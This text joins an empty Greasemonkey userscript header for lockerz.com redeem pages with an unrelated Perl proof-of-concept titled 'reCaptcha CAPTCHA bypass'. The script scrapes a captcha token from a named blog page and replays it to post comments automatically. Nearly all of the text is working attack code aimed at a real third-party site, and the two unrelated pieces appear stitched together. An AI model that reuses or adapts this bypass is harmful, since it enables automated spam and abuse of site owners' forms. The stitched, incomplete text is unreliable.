// ==UserScript==
// @name MB
// @namespace IL
// @description Fills in the form
// @include http://www.lockerz.com/redeem*
// @author MB
// @copyright MB,2010
// @version 1.6
// @uso:rating 10
// @optimize 1
// ==/UserScript==

#!/usr/bin/perl
# MoBiC-04: reCaptcha CAPTCHA bypass
# Made by MustLive
# http://websecurity.com.ua
# 28.10.2007
use LWP::UserAgent;
use HTTP::Cookies;

my $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414";
my $page_url = "http://www.keng.ws/2007/09/329";
my $url = "http://www.keng.ws/comment/reply/329";

my $ua = LWP::UserAgent->new;
$ua->agent($agent);
$ua->cookie_jar(HTTP::Cookies->new(file => "reCaptcha_cookies.txt",autosave => 1));

print "Content-type:text/html\n\n";
my $captcha_token = &GetToken;
&BypassCaptcha if ($captcha_token);
exit;

sub GetToken() {
	my $res = $ua->get($page_url);

	if ($res->is_success) {
		$res->content =~ /id="edit-captcha-token" value="(.+?)"/;
		return $1;
	}
	else {
		print "Error: " . $res->status_line;
		return 0;
	}
}

sub BypassCaptcha() {
	my %fields = (
	'name' => 'Test',
	'mail' => 'test@test.test',
	'homepage' => 'http://websecurity.com.ua',
	'comment' => 'Captcha bypass test.',
	'form_id' => 'comment_form',
	'captcha_token' => $captcha_token,
	'op' => 'Post comment'
	);
	my $res = $ua->post($url,[%fields]);

	if ($res->status_line =~ "^302") {
		$res = $ua->get($page_url);
		if ($res->is_success) {
			print $res->content;
		}
		else {
			print "Error: " . $res->status_line;
		}
	}
	else {
		print "Error: " . $res->status_line;
	}
}